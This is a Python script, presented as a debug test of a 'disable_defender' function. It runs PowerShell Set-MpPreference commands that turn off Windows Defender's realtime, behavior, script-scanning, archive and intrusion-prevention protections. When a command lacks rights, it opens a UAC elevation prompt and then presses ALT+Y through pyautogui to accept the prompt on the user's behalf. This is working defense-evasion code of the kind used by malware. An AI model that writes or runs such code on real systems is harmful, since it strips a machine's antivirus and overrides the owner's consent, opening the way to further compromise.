"""
Test script for disable_defender function
Run this to debug and see PowerShell output
"""

import os
import sys

# Add the current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import required modules
import ctypes
import subprocess
import time
import pyautogui

WINDOWS = True

def disable_defender_test(debug=True):
    """Test version of disable_defender with debug output"""
    print("=" * 60)
    print("[*] TESTING DISABLE DEFENDER FUNCTION")
    print("=" * 60)
    
    # PowerShell commands to disable Windows Defender
    ps_commands = [
        ("Set-MpPreference -DisableRealtimeMonitoring $true", "Realtime Monitoring"),
        ("Set-MpPreference -DisableBehaviorMonitoring $true", "Behavior Monitoring"),
        ("Set-MpPreference -DisableBlockAtFirstSeen $true", "Block At First Seen"),
        ("Set-MpPreference -DisableIOAVProtection $true", "IOAV Protection"),
        ("Set-MpPreference -DisableScriptScanning $true", "Script Scanning"),
        ("Set-MpPreference -DisableArchiveScanning $true", "Archive Scanning"),
        ("Set-MpPreference -DisableIntrusionPreventionSystem $true", "Intrusion Prevention System"),
    ]

    for ps_cmd, feature_name in ps_commands:
        print(f"\n[*] Disabling {feature_name}...")
        print(f"    Command: {ps_cmd}")
        
        # First try without elevation to see the error
        result = subprocess.run(
            ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
            capture_output=True,
            text=True
        )
        
        print(f"    [DEBUG] Return code: {result.returncode}")
        if result.stdout.strip():
            print(f"    [DEBUG] stdout: {result.stdout.strip()}")
        if result.stderr.strip():
            print(f"    [DEBUG] stderr: {result.stderr.strip()}")
        
        if result.returncode != 0 or result.stderr.strip():
            print(f"[-] {feature_name} needs admin rights - trying UAC elevation...")
            
            # Use ShellExecute for UAC elevation
            try:
                ret = ctypes.windll.shell32.ShellExecuteW(
                    None,
                    "runas",  # Run as administrator
                    "powershell.exe",
                    f'-ExecutionPolicy Bypass -Command "{ps_cmd}"',
                    None,
                    1  # SW_SHOWNORMAL - show window for debugging
                )
                print(f"    [DEBUG] ShellExecuteW returned: {ret}")
                
                if ret > 32:  # Success if > 32
                    print(f"    [*] UAC prompt opened, waiting 2 seconds...")
                    time.sleep(2)
                    print(f"    [*] Pressing ALT+Y to accept UAC (Yes button)...")
                    pyautogui.hotkey("alt", "y")
                    print(f"[+] {feature_name} - UAC accepted!")
                else:
                    print(f"[-] {feature_name} - ShellExecuteW failed with code {ret}")
            except Exception as e:
                print(f"[-] Error: {e}")
        else:
            print(f"[+] {feature_name} disabled successfully (no admin needed)!")
        
        time.sleep(1)  # Small delay between commands
    
    print("\n" + "=" * 60)
    print("[+] TEST COMPLETED")
    print("=" * 60)


if __name__ == "__main__":
    print("\n[!] This script will attempt to disable Windows Defender")
    print("[!] UAC prompts will appear - the script will try to auto-accept them")
    print("[!] Starting in 3 seconds...\n")
    time.sleep(3)
    
    disable_defender_test(debug=True)

